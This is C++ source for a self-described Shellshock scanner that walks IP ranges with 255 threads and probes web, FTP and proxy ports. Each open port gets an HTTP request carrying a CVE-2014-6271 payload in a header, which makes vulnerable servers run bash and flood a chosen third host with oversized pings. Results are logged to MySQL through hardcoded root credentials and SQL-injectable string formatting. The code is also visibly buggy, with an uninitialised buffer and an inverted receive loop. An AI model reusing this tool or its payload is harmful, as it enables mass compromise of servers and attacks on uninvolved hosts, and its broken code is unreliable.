//Source from https://codereview.stackexchange.com/questions/102556/ip-range-port-scanner
//#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#ifdef __WIN32__
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netdb.h>
#endif
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <mysql/mysql.h>

#pragma comment(lib, "ws2_32.lib")

// Mysql Details
    char *mysqlhost = "localhost";
    char *mysqluser = "root";
    char *mysqlpass = "password";
    char *mysqldb1 = "test";
// Mysql Details end

// USERAGENT Fakeing
#define USERAGENT "Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14B100 Safari/602."
// end USERAGENT Fakeing

typedef void *PVOID;
typedef void *HANDLE;
#ifdef __linux__
typedef int SOCKET;
typedef void *LPTHREAD_START_ROUTINE;
typedef void *LPVOID;
typedef void *DWORD;
#endif
using namespace std;

enum Thread_Type
{
    NONE,
    T_SCAN
};

struct Single_Thread
{
    HANDLE      tHandle;
    Thread_Type tType;
    SOCKET tSock;

};

struct Scan_Job
{
    SOCKET Sock;
    string IPAddress;
    short int port;
    short int threadNum;
    short int totalThreads;
    string *ptrIP; // Pointer To The IPAdress Above
};

typedef struct
{
    short int port;
    bool isOpen;
    function<void(Scan_Job hScanJob)> Port_Function;
} Port_Struct;

char *page,*host,*appli, *target;
vector<thread> quenceThreads;   // I Use this to push threads
Single_Thread hThreads[256];

int mysqldb(const char *ip,int port,char *message)
{
	char buff[250];

    //sock
    MYSQL *sock;
    sock = mysql_init(0);
    if (sock) cout << "mysql sock handle ok!" << endl;
    else {
         cout << "mysql sock handle failed!" << mysql_error(sock) << endl;
    }

    //connection
    if (mysql_real_connect(sock, mysqlhost, mysqluser, mysqlpass, mysqldb1, 0, NULL, 0))
         cout << "mysql connection ok!" << endl;
    else {
         cout << "mysql connection fail: " << mysql_error(sock) << endl;
    }

    //wait for posibility to check system/mysql sockets
    //system("PAUSE");
    // send the query to the database
	if (mysql_query(sock, "CREATE TABLE IF NOT EXISTS SCANNER (ID int(11) unsigned NOT NULL auto_increment,IP varchar(255) NOT NULL ,PORT varchar(255) NOT NULL ,MESSAGE varchar(255) NOT NULL ,SEEN varchar(255) NOT NULL ,PRIMARY KEY  (ID));"))
   	{
      printf("mysql query error : %s\n", mysql_error(sock));
   	}
	
	snprintf(buff,250,"INSERT INTO SCANNER (IP, PORT, MESSAGE, SEEN) values ('%s', '%d', '%s', now());",ip,port,message);
	if (mysql_query(sock, buff))
   	{
      printf("mysql query error : %s\n", mysql_error(sock));
   	}

    //closing connection
    mysql_close(sock);

    return 0;
}

int mysqllog(const char *ip,int port,char *message)
{
	char buff[250];

    //sock
    MYSQL *sock;
    sock = mysql_init(0);
    if (sock) cout << "mysql sock handle ok!" << endl;
    else {
         cout << "mysql sock handle failed!" << mysql_error(sock) << endl;
    }

    //connection
    if (mysql_real_connect(sock, mysqlhost, mysqluser, mysqlpass, mysqldb1, 0, NULL, 0))
         cout << "mysql connection ok!" << endl;
    else {
         cout << "mysql connection fail: " << mysql_error(sock) << endl;
    }

    //wait for posibility to check system/mysql sockets
    //system("PAUSE");
    // send the query to the database
	if (mysql_query(sock, "CREATE TABLE IF NOT EXISTS PORTOPEN (ID int(11) unsigned NOT NULL auto_increment,IP varchar(255) NOT NULL ,PORT varchar(255) NOT NULL ,MESSAGE varchar(255) NOT NULL ,SEEN varchar(255) NOT NULL ,PRIMARY KEY  (ID));"))
   	{
      printf("mysql query error : %s\n", mysql_error(sock));
   	}
	
	snprintf(buff,250,"INSERT INTO PORTOPEN (IP, PORT, MESSAGE, SEEN) values ('%s', '%d', '%s', now());",ip,port,message);
	if (mysql_query(sock, buff))
   	{
      printf("mysql query error : %s\n", mysql_error(sock));
   	}

    //closing connection
    mysql_close(sock);

    return 0;
}

int mysqlerr(const char *ip,int port,char *message)
{
	char buff[250];

    //sock
    MYSQL *sock;
    sock = mysql_init(0);
    if (sock) cout << "mysql sock handle ok!" << endl;
    else {
         cout << "mysql sock handle failed!" << mysql_error(sock) << endl;
    }

    //connection
    if (mysql_real_connect(sock, mysqlhost, mysqluser, mysqlpass, mysqldb1, 0, NULL, 0))
         cout << "mysql connection ok!" << endl;
    else {
         cout << "mysql connection fail: " << mysql_error(sock) << endl;
    }

    //wait for posibility to check system/mysql sockets
    //system("PAUSE");
    // send the query to the database
	if (mysql_query(sock, "CREATE TABLE IF NOT EXISTS ERRORID (ID int(11) unsigned NOT NULL auto_increment,IP varchar(255) NOT NULL ,PORT varchar(255) NOT NULL ,MESSAGE varchar(255) NOT NULL ,SEEN varchar(255) NOT NULL ,PRIMARY KEY  (ID));"))
   	{
      printf("mysql query error : %s\n", mysql_error(sock));
   	}
	
	snprintf(buff,250,"INSERT INTO ERRORID (IP, PORT, MESSAGE, SEEN) values ('%s', '%d', '%s', now());",ip,port,message);
	if (mysql_query(sock, buff))
   	{
      printf("mysql query error : %s\n", mysql_error(sock));
   	}

    //closing connection
    mysql_close(sock);

    return 0;
}

int Modulus(int iN, int iMod) {
	int iQ = (iN/iMod);
	return iN - (iQ*iMod);
}

char GetChar(int iGenerator, char cBase, int iRange) {
	return (cBase + Modulus(iGenerator, iRange));
}

int matrix() {
	char caRow[80];
	int j = 7;
	int k = 2;
	int l = 5;
	int m = 1;
	for (int ccc = 0;ccc <= 255;ccc++) {
		// Output a random row of characters
		for ( int i = 0; i < 80; ++i ) 
		{
			if (caRow[i] != ' ') {
				caRow[i] = GetChar(j + i*i, 33, 30);
				if (((i*i + k) % 71) == 0) {
					;
				} else {
					;
				}
			}
			std::cout << caRow[i];
			;
		}
		j = (j + 31);
		k = (k + 17);
		l = (l + 47);
		m = (m + 67);
		caRow[Modulus(j, 80)] = '-';
		caRow[Modulus(k, 80)] = ' ';
		caRow[Modulus(l, 80)] = '-';
		caRow[Modulus(m, 80)] = ' ';
		// Delay
		Sleep(10);
	} //end for
    return 0;
}

void logo(){
	printf("\t\t\t\t     (\\               /)\n");
	printf("\t\t\t\t    __)\\             /(__\n");
	printf("\t\t\t\t   __)_ \\  (\\!~!/)  / _(__\n");
	printf("\t\t\t\t  __)_ `.\\  )d b(  /.' _(__\n");
	printf("\t\t\t\t___)_ `. \\\(  _  )// .' _(___\n");
	printf("\t\t\t\t )_  `. \\  ((q_p))  / .'  _(_\n");
	printf("\t\t\t\t _)`.  \\  ,-)\\_/(-.  /  .'(_\n");
	printf("\t\t\t\t  _) ,-._/v/vvvvv\v\\_,-. (_\n");
	printf("\t\t\t\t  _)///(._/v(___)v\\_.)\\\(_\n");
	printf("\t\t\t\t   \\_ ___/v(_____)v\\___ _/\n");
	printf("\t\t\t\t     /vvv\\(_______)/vvv\\\n");
	printf("\t\t\t\t     \\vvv/v(_____)v\\vvv/  \n");
	printf("\t\t\t\t     _\\vv\\\v(___)v//vv/_\n");
	printf("\t\t\t\t    '>_`  \\`-._.-'/  '_<`\n");
	printf("\t\t\t\t    ' >_,-'       `-._<`\n");
}
void iam()
{
	printf("\t\t\t /\\_./o__    \n");
	printf("\t\t\t(/^/(_^^'     \n");
	printf("\t\t\t_.(_.)_       \n");  
	printf("\t\t\tShellShockScanner Version 1.1\n");
} 

void usage()
{
	iam();
  fprintf(stderr, "\n\x1b[33m\tUSAGE: %s HOST PAGE TARGET\n\n\
\t\t\x1b[31m exploiting shellshock CVE-2014-6271... \n\n\
\tHOST: the ip address. ex: 192.168.0.1\n\
\tPAGE: the page to retrieve. ex: cgi-bin/index.cgi, default: /\n\
\tTARGET: the target hostname. ex: www.target.org\n\n\x1b[0m",appli);
	iam();
}

char *build_get_query(const char *host, char *page)
{
  char *query;
  char *getpage = page;
  char *tpl = "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nrunaway:env x='() { :;}; ' $(command -v bash) -i >& $(command -v ping) -c 50 -s 56535 %s 0>&1 : Connection: close:\r\n\r\n";
  
  if(getpage[0] == '/'){
    getpage = getpage + 1;
  
  }
  // -5 is to consider the %s %s %s in tpl and the ending \0
  
  query = (char *)malloc(strlen(getpage)+strlen(host)+strlen(USERAGENT)+strlen(target)+strlen(tpl)-6);
  
  sprintf(query, tpl, getpage, host, USERAGENT, target);
  
  return query;
}

char *build_connect_query(const char *host, char *page)
{
  char *query;
  char *getpage = page;
  char *tpl = "CONNECT %s/%s HTTP/1.1\r\nHost: %s \r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nrunaway:env x='() { :;}; ' $(command -v bash) -i >& $(command -v ping) -c 50 -s 56535 %s 0>&1 : Connection: close:\r\n\r\n";
  
  if(getpage[0] == '/'){
    getpage = getpage + 1;
  
  }
  // -5 is to consider the %s %s %s in tpl and the ending \0
  
  query = (char *)malloc(strlen(getpage)+strlen(host)+strlen(target)+strlen(USERAGENT)+strlen(target)+strlen(tpl)-7);
  
  sprintf(query, tpl, host, getpage, target, USERAGENT, target);
  
  return query;
}

// Generic Proxy Banner Grabber
// Works On Any Non SSL Protocol That Begins With A Send()
// Tested On: PROXY
void Generic_Recv_Proxy_Banner_Grabber(Scan_Job sJob)
{
	char *get,*buf;
	int tmpres;
    SOCKET Sock;
    char recvBuf[256];

    // Define Socket & Make Sure Its Valid
    Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (Sock == -1)
    {
        // error handling code
    }

    // Setup Connection Struct
    sockaddr_in sockAddr;
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(sJob.port);
    sockAddr.sin_addr.s_addr = inet_addr(sJob.IPAddress.c_str());
    	struct timeval timeout;      
    	timeout.tv_sec = 120;
    	timeout.tv_usec = 0;

    	if (setsockopt (Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
        	perror("setsockopt failed\n");}

    	if (setsockopt (Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
        	perror("setsockopt failed\n");}

    // Connect to the server
    if (connect(Sock, (sockaddr*)(&sockAddr), sizeof(sockAddr)) != 0)
    {
        cout << "Recieved Socket Error While Attempting To Connect To " << sJob.IPAddress << ":" << sJob.port << endl;
        mysqlerr(sJob.IPAddress.c_str(),sJob.port,"Recieved Socket Error");
    }
    else
    {
        cout << "Successfully Connected To " << sJob.IPAddress << ":" << sJob.port << " To Do Banner Grab!" << endl;
        if (recv(Sock, recvBuf, sizeof(recvBuf), 0) != 0)
        {
            cout << "Data: " << recvBuf << endl;
        }
  		get = build_connect_query(sJob.IPAddress.c_str(), page);
  		fprintf(stderr, "Query is:\n<<START>>\n%s<<END>>\n", get);
 
  		//Send the query to the server
  		int sent = 0;

  		while(sent < strlen(get))
  		{
    		tmpres = send(Sock, get+sent, strlen(get)-sent, 0);
    		if(tmpres == -1){
      			perror("Can't send query");
    			}
    		sent += tmpres;
  		}
  
  
  		//now it is time to receive the page
  		memset(buf, 0, sizeof(buf));
  		int htmlstart = 0;
  		char * htmlcontent;

		while((tmpres = recv(Sock,buf,BUFSIZ,0)) < 0){
			if(htmlstart == 0){
				htmlcontent = strstr(buf,"\r\n");
				
				if(htmlcontent != NULL){
					htmlstart = 1;
					htmlcontent += 4;
				}else{
					htmlcontent = buf;
				}
				
				if(htmlstart){
					fprintf(stdout,htmlcontent);
				}
				
				memset(buf,0,tmpres);
				
			}
			
			if(tmpres < 0){
				perror("error reciving data");
			}
		}   mysqldb(sJob.IPAddress.c_str(),sJob.port,recvBuf); 
	}
	
#ifdef __WIN32__
    closesocket(Sock);
#else
	close(Sock);
#endif
}
// Generic Banner Grabber
// Works On Any Non SSL Protocol That Begins With A Send()
// Tested On: FTP HTTP HTTPS
void Generic_Recv_Banner_Grabber(Scan_Job sJob)
{
	char *get,*buf;
	int tmpres;
    SOCKET Sock;
    char recvBuf[256];

    // Define Socket & Make Sure Its Valid
    Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (Sock == -1)
    {
        // error handling code
    }

    // Setup Connection Struct
    sockaddr_in sockAddr;
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(sJob.port);
    sockAddr.sin_addr.s_addr = inet_addr(sJob.IPAddress.c_str());
    	struct timeval timeout;      
    	timeout.tv_sec = 120;
    	timeout.tv_usec = 0;

    	if (setsockopt (Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
        	perror("setsockopt failed\n");}

    	if (setsockopt (Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout,sizeof(timeout)) < 0){
        	perror("setsockopt failed\n");}

    // Connect to the server
    if (connect(Sock, (sockaddr*)(&sockAddr), sizeof(sockAddr)) != 0)
    {
        cout << "Recieved Socket Error While Attempting To Connect To " << sJob.IPAddress << ":" << sJob.port << endl;
    }
    else
    {
        cout << "Successfully Connected To " << sJob.IPAddress << ":" << sJob.port << " To Do Banner Grab!" << endl;
        if (recv(Sock, recvBuf, sizeof(recvBuf), 0) != 0)
        {
            cout << "Data: " << recvBuf << endl;
        }
  		get = build_get_query(sJob.IPAddress.c_str(), page);
  		fprintf(stderr, "Query is:\n<<START>>\n%s<<END>>\n", get);
 
  		//Send the query to the server
  		int sent = 0;

  		while(sent < strlen(get))
  		{
    		tmpres = send(Sock, get+sent, strlen(get)-sent, 0);
    		if(tmpres == -1){
      			perror("Can't send query");
    			}
    		sent += tmpres;
  		}
  
  
  		//now it is time to receive the page
  		memset(buf, 0, sizeof(buf));
  		int htmlstart = 0;
  		char * htmlcontent;

		while((tmpres = recv(Sock,buf,BUFSIZ,0)) < 0){
			if(htmlstart == 0){
				htmlcontent = strstr(buf,"\r\n");
				
				if(htmlcontent != NULL){
					htmlstart = 1;
					htmlcontent += 4;
				}else{
					htmlcontent = buf;
				}
				
				if(htmlstart){
					fprintf(stdout,htmlcontent);
				}
				
				memset(buf,0,tmpres);
				
			}
			
			if(tmpres < 0){
				perror("error reciving data");
			}
		}   mysqldb(sJob.IPAddress.c_str(),sJob.port,recvBuf); 
	}
	
#ifdef __WIN32__
    closesocket(Sock);
#else
	close(Sock);
#endif
}

int Thread_Add(Thread_Type type)
{
    int i;

    for (i = 0; i < 256; i++)
    {
        if (hThreads[i].tHandle == 0)
        {
            break;
        }
    }

    if (i == 256)
    {
        i = -1;
    }
    else
    {
        hThreads[i].tType = type;
    }

    cout << "Adding Thread Number: " << i << endl;
    return(i);
}

void Thread_Clear(int num)
{
    hThreads[num].tHandle   = 0;
    hThreads[num].tType     = NONE; // Enum For 0
#ifdef __WIN32__
    closesocket(hThreads[num].tSock);
#else
	close(hThreads[num].tSock);
#endif
}

int Thread_Check(Thread_Type type)
{
    int i, k = 0;

    for (i = 0; i < 256; i++)
    {
        if (hThreads[i].tType == type)
        {
            k++;
        }
    }

    return(k);
}

HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, bool wait)
{
    DWORD  id = 0;
    HANDLE tHandle;

    tHandle = CreateThread(0, 0, function, (LPVOID)param, 0, &id);

    if (wait)
    {
        WaitForSingleObject(tHandle, INFINITE);
        CloseHandle(tHandle);
    }
    else
    {
        Sleep(30); // Do This Better
    }

    return(tHandle);
}

int Thread_Kill(Thread_Type type)
{
    int i, k = 0;

    for (i = 0; i < 256; i++)
    {
        if (hThreads[i].tType == type)
        {
            TerminateThread(hThreads[i].tHandle, 0);
            Thread_Clear(i);
            k++;
        }
    }

    return(k);
}

// Increment IP Address
void AdvGetNextIPPointer(string *host)
{
    struct in_addr paddr;

    // Convert String To ULONG
    u_long addr1 = inet_addr(host->c_str());

    // Convert ULONG To Network Byte Order
    addr1 = ntohl(addr1);

    // Incremement By 1
    addr1 += 1;

    // Convert Network Byte Order Back To ULONG
    addr1 = htonl(addr1);

    // Convert ULONG Back To in_addr Struct
    paddr.s_addr = addr1;

    // Convert Back To String
    *host = inet_ntoa(paddr);
}

// This Function Checks If A Remote Port Is Open
#ifdef __WIN32__
bool PortCheck(SOCKET sock, string ip, int port)
#else
bool PortCheck(int sock, char ip, int port)
#endif
{
    struct sockaddr_in  sin;
    unsigned long       blockcmd = 1;

    // Define Socket & Make Sure Its Valid
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1)
    {
        cout << "Bad Socket, Was Winsock Initialized?" << endl;
        return(false);
    }

    // Setup Winsock Struct
    sin.sin_family              = AF_INET;
    sin.sin_addr.s_addr    = inet_addr(ip.c_str());    // Update this function to be safe
    sin.sin_port                = htons(port);

    // Set Socket To Non-Blocking
    ioctlsocket(sock, FIONBIO, &blockcmd);

    // Make Connection
    connect(sock, (struct sockaddr *)&sin, sizeof(sin));

    // Setup Timeout
    struct timeval tv;
    tv.tv_sec = 5; // Seconds
    tv.tv_usec = 0;

    // Setup Result Set
    FD_SET  rset;
    FD_ZERO(&rset);
    FD_SET(sock, &rset);

    // Move Pointer
    int i = select(0, 0, &rset, 0, &tv);

    // Close Socket
    closesocket(sock);

    // Return Result
    if (i <= 0) {
        return(false);
    }
    else {
        return(true);
    }
}

// This Is Our Individual Scan Thread
DWORD WINAPI Scan_Thread(LPVOID passedParams)
{
    mutex m;
    IN_ADDR hInetAddress;
    Scan_Job hExpScanJob;

    Scan_Job hScanJob = *static_cast<Scan_Job *>(passedParams);

    cout << "IP: " << hScanJob.IPAddress << " Threads: " << hScanJob.totalThreads << " This Thread: " << hScanJob.threadNum << endl;

    // Define What Ports Trigger What Functions Here
    Port_Struct hPorts[] =
    {
        { 21,   false,  Generic_Recv_Banner_Grabber },
        { 2121,   false,  Generic_Recv_Banner_Grabber },
        { 80,   false,  Generic_Recv_Banner_Grabber },
        { 81,   false,  Generic_Recv_Banner_Grabber },
        { 443,   false,  Generic_Recv_Banner_Grabber },
        { 3128,   false,  Generic_Recv_Proxy_Banner_Grabber },
        { 8080,   false,  Generic_Recv_Banner_Grabber },
        { 8081,   false,  Generic_Recv_Banner_Grabber },
        { 0,    false,  0 }
    };

    while (true)
    {
        // Lock Because We Are Altering A Shared Resource
        m.lock();
            AdvGetNextIPPointer(hScanJob.ptrIP); // Increment IP Address
        m.unlock();

        cout << "Checking " << *hScanJob.ptrIP << endl;

        hInetAddress.s_addr = inet_addr(hScanJob.ptrIP->c_str()); // Loading Scan IP Into Needed Struct

        // Set isOpen Flag To False On All Ports Before It Becomes A Meaningful Value
        for (int i = 0; hPorts[i].port != 0; i++)
        {
            hPorts[i].isOpen = false;
        }

        // Check Each Port Using PortCheck() Function
        for (int i = 0; hPorts[i].port != 0; i++)
        {
            hPorts[i].isOpen = PortCheck(hThreads[hScanJob.threadNum].tSock, *hScanJob.ptrIP, hPorts[i].port);
        }

        // Check The PortChecker() Results
        for (int i = 0; hPorts[i].port != 0; i++)
        {
            // Is Port Open?
            if (hPorts[i].isOpen)
            {
                m.lock();
                    cout << "Port Open: " << inet_ntoa(hInetAddress) << ":" << hPorts[i].port << endl;
                    mysqllog(inet_ntoa(hInetAddress),hPorts[i].port,"Port Open"); 
                    hExpScanJob.IPAddress = *hScanJob.ptrIP;
                    hExpScanJob.port = hPorts[i].port;

                    quenceThreads.push_back(thread(hPorts[i].Port_Function, hExpScanJob));
                m.unlock();
            }
        }
    }

    Thread_Clear(hScanJob.threadNum);
    ExitThread(0);
}

// This Function Starts Our Scan Threads
void Start_Scan(Scan_Job hScanJob)
{
    int rThreads = 0;
    printf("\x1b[32m");
	logo();
	matrix();
	printf("\x1b[0m");
	
    // Check If We Are Already Scanning
    if (Thread_Check(T_SCAN))
    {
        cout << "Scan Is Already Running" << endl;
        return;
    }

    // Create Our Desired Number Of Scan Threads
    for (int i = 0; i < hScanJob.totalThreads; i++)
    {
        hScanJob.threadNum = Thread_Add(T_SCAN);

        if (hScanJob.threadNum != -1)
        {
            if ((hThreads[hScanJob.threadNum].tHandle = Thread_Start(Scan_Thread, &hScanJob, false)) != 0)
            {
                rThreads++;
            }
        }
    }
}

// Entry Point
int main(int argc, char **argv)
{
	appli = argv[0];
	if(argc < 4){
  		usage();
    	return 0;
  	}
#ifdef __WIN32__
    SOCKET Sock;
    WSADATA WsaDat;
    string testCommand;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &WsaDat) != 0)
    {
        cout << "Winsock Initialization Failed!" << endl;
        WSACleanup();
        return 0;
    }
#else
	int Sock;
#endif
    // Define Socket
    Sock = socket(AF_INET, SOCK_STREAM, 0);
    if (Sock == -1)
    {
        cout << "Bad Socket, Was Winsock Initialized?" << endl;
        return 0;
    }

    // Create Our Scan Job
    Scan_Job hScanJob;
    hScanJob.IPAddress      = argv[1];
    hScanJob.totalThreads   = 255;
    hScanJob.ptrIP          = &hScanJob.IPAddress;
    host = argv[1];
	page = argv[2];
	target = argv[3];

    // Launch The Scan Thread
    thread tScanThread(Start_Scan, hScanJob);

    // This Holds Up The Program From Ending
    while (Thread_Check(T_SCAN))
    {
        // cout << "Scan Is Running" << endl;
    }

//  Thread_Kill(T_SCAN); // Kill The Scan Thread
    return 0;
}
